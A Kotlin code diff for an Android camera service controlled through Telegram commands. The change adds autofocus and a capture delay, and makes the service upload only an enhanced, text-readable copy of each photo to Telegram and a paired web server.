@@ -284,7 +284,10 @@ class CameraSessionService : Service(), LifecycleOwner {
         sending = true
         updateNotification("جاري التقاط الصورة وإرسالها إلى تيليجرام…")
         val original = File(cacheDir, "MANW_REMOTE_" + System.currentTimeMillis() + ".jpg")
-        capture.takePicture(OutputFileOptions.Builder(original).build(),
+        // Meter focus/exposure before capture so text has a chance to become sharp.
+        focusCenter()
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            capture.takePicture(OutputFileOptions.Builder(original).build(),
             ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback {
                 override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                     Thread {
@@ -293,28 +296,24 @@ class CameraSessionService : Service(), LifecycleOwner {
                             ImageClarity.createReadableCopy(original, enhanced)
                             true
                         } catch (_: Exception) { false }
-                        val originalResult = uploadPhoto(original, "الصورة الأصلية")
-                        val enhancedResult = if (enhancedReady) uploadPhoto(enhanced, "نسخة محسّنة للوضوح والقراءة") else Pair(false, "تعذر إنشاء النسخة المحسّنة")
+                        val enhancedResult = if (enhancedReady) uploadPhoto(enhanced, "الصورة المحسّنة تلقائياً — أوضح للقراءة") else Pair(false, "تعذر إنشاء الصورة المحسّنة")
                         val prefs = SecurePrefs.get(this@CameraSessionService)
-                        if (prefs.getBoolean("web_paired", false)) {
+                        if (prefs.getBoolean("web_paired", false) && enhancedReady) {
                             val base = prefs.getString("web_base_url", "").orEmpty()
                             val deviceToken = prefs.getString("web_device_token", "").orEmpty()
                             try {
-                                WebControlClient.upload(base, deviceToken, original, "MANW_ORIGINAL_" + original.name)
-                                if (enhancedReady) WebControlClient.upload(base, deviceToken, enhanced, "MANW_CLEAR_" + enhanced.name)
+                                WebControlClient.upload(base, deviceToken, enhanced, "MANW_CLEAR_" + enhanced.name)
                             } catch (_: Exception) { }
                         }
                         val recognized = if (enhancedReady) try { extractReadableText(enhanced) } catch (_: Exception) { "" } else ""
                         if (recognized.isNotBlank()) sendRecognizedText(recognized)
-                        val allSent = originalResult.first && (!enhancedReady || enhancedResult.first)
-                        if (allSent) {
+                        if (enhancedReady && enhancedResult.first) {
                             original.delete()
                             enhanced.delete()
-                            sendStatus("تم التصوير وإرسال الصورة الأصلية والنسخة المحسّنة إلى تيليجرام." +
+                            sendStatus("تم تحسين الصورة وإرسال النسخة المحسّنة فقط." +
                                 if (recognized.isNotBlank()) " وتم استخراج النص." else " لم يتم العثور على نص واضح.")
                         } else {
-                            val reason = if (!originalResult.first) originalResult.second else enhancedResult.second
-                            sendStatus("التقطت الصورة لكن تعذر إرسال كل النسخ. $reason")
+                            sendStatus("تم التقاط الصورة لكن تعذر إرسال النسخة المحسّنة. " + enhancedResult.second)
                         }
                         sending = false
                         updateNotification("جلسة الكاميرا نشطة. أرسل /capture للتصوير أو /stopcamera للإيقاف.")
@@ -326,6 +325,7 @@ class CameraSessionService : Service(), LifecycleOwner {
                     updateNotification("جلسة الكاميرا نشطة. أرسل /capture لإعادة المحاولة.")
                 }
             })
+        }, 850L)
     }
 
     private fun uploadPhoto(file: File, caption: String): Pair<Boolean, String> {
